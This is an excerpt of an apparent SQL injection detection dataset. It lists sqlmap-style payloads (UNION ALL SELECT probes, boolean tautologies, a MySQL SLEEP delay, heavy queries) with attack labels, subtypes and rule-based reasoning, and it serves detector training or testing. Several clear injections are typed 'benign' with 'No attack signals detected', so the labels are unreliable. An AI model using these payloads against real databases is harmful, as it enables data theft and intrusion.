row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9677,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9678,"-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu",1,,boolean_blind,generic,0.95,6872 = 6872 and detected — boolean_blind injection (priority 8) on generic,rule-based
9679,"-9737"" ) ) ) order by 1--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9680,1' ) as wvvo where 4288 = 4288,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9681,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""tpxo"" like ""tpxo",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9682,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
9683,"-1920' ) ) ) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9684,1'|| ( select 'ubza' where 2576 = 2576,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9685,-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9686,1 ) ) as vmwj where 5597 = 5597,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9687,"-8301' ) union all select 1806,1806--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9688,1' ) as sruz where 6318 = 6318,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9689,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'jxqf' like 'jxqf",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
